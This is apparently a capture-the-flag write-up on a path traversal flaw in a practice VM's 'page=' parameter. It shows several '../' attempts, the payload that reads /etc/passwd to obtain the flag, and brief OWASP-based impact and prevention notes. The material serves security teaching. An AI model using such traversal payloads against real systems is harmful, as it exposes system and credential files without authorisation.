# PATH TRAVERSAL

## Explanation

I found the vulnerability "path traversal" on OWASP website.

In the examples provided :
- `http://some_site.com.br/some-page.asp?page=index.html`
  - => is said vulnerable to the following url vulnerability
- `http://some_site.com.br/some-page.asp?page=../../../../dir/file`

It's very similar to the system used in darly's website to navigate between pages
- `http://VM_IP/?page=`

I tried
- `http://VM_IP/?page=../../../`
  - => error message is `"Nope..."`
- `http://VM_IP/?page=../../../../../../../../../../../../../../`
  - => error message is `"You can DO it !!!  :]"`

Understood that I had to go for a specific file
OWASP explicitely says to try for the /etc/passwd file

- `http://VM_IP/?page=../../../../../../../etc/passwd`
  - => Got the flag

## Exploitation

This attack is for the attacker to access arbitrary files and directories stored on file system including :
  - application source code
  - configuration files
  - critical system files

The attacker could then use these pieces of information to penetrate the system further for example.

## Prevention

> - Don’t store sensitive configuration files inside the web root
> - Prefer working without user input when using file system calls
> - Ensure the user cannot supply all parts of the path – surround it with your path code
